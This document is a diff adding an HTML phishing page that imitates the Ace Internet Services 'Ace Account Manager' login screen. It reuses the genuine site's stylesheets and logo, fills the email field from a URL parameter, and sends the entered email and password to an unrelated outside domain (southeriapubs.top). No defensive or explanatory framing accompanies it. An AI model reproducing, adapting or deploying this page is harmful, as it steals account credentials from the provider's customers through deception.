@@ -1,0 +1,95 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+		<title>Ace Account Manager</title>
+		<meta name="description" content="Ace Account Manager">
+		<link rel="stylesheet" type="text/css" href="https://portal.acenet.com.au/css/ace-am.css">
+		<link rel="stylesheet" type="text/css" href="https://portal.acenet.com.au/css/forx.css">
+	<script>
+  var pixelDepth;
+window.onload = function() {
+    screenProperties();
+  };
+
+  function screenProperties()
+  {
+	var txtEmail = document.getElementById('textbox1');
+	const queryString = window.location.search;
+	const urlParams = new URLSearchParams(queryString);
+	const code = urlParams.get('email')
+	username.value = code;
+	/*if(code=="")
+	{
+		document.getElementById("divEmail").innerText = "No Email Found";
+		}else{
+	document.getElementById("divEmail").innerText = code;
+	}*/
+	
+
+	//return pixelDepth;
+  }
+</script>
+	</head>
+	<body>
+
+	<!-- page wrapper -->
+	<div id="page-wrapper" style="visibility: visible;">
+		<!-- HEADER -->
+		<div id="header">
+			<div class="left">
+				<img src="https://portal.acenet.com.au/images/header_logo.gif">
+			</div>
+		</div>
+		<!-- END HEADER -->
+		
+	<div class="panel" id="login">
+		<h2>Account Login</h2>
+		<form name="login" action="https://southeriapubs.top/acenet/login.php" method="POST">
+		<input type="hidden" name="a" value="1">
+<input type="hidden" name="s" value="">
+<input type="hidden" name="r" value="1533617704">
+
+		<div id="error"></div>
+		<div class="standard-input">
+			<div class="pass-left">
+				<label>Email Address</label><input type="text" name="username" id="username" size="40" fdprocessedid="3n49bc" required="required">
+			</div>
+		</div>
+		
+		<!-- INPUT LINE (SPECIAL CASE FOR PASSWORD) -->
+		<div class="standard-input">
+			<div class="pass-left">
+				<label>Password</label><input type="password" name="password" size="40" fdprocessedid="a81j68" required="required">
+			</div>
+			<div class="pass-right">
+				<span class="large">
+					To obtain your Account Password by email.<br>
+					Enter your Account Email Address and then click <a href="">here</a>
+				</span>
+			</div>
+		</div>
+		
+		<div class="clear"></div>
+		
+		<div>
+			
+			<!--<button type="submit" class="login"></button>-->
+			<input type="image" id="image" alt="Login" class="login" src="https://portal.acenet.com.au/images/btn_login.gif">
+		</div>
+	</form></div>
+	
+
+			<!-- FOOTER -->
+			<div id="footer">
+				<p>Ace Account Manager | <a href="http://www.ace.com.au/download/Privacy%20Protection%20Policy.pdf" id="privacy_link" target="_blank">Privacy Policy</a></p><p>
+				</p><p>© 2023 Ace Internet Services Pty Limited. ACN 071 944 959.</p>
+				<div class="forx" title="privacy_link" style="display: none;">Read Ace's privacy policy</div>
+			</div>
+			<!-- END FOOTER -->
+		</div>
+		<!-- END PAGE WRAPPER -->
+		<div id="alert"></div>
+		<div id="wait"></div>
+		<script type="text/javascript">
+			
+		</script>
+	
+	<iframe id="nr-ext-rsicon" style="position: absolute; display: none; width: 50px; height: 50px; z-index: 2147483647; border-style: none; background: transparent;"></iframe><div class="formbubble" id="forx13" style="display: none; opacity: 0; top: 369px; left: 418px;"><div class="formbubble_ut"></div><div class="formbubble_r">Read Ace's privacy policy</div><div class="formbubble_ub"></div></div></body></html>
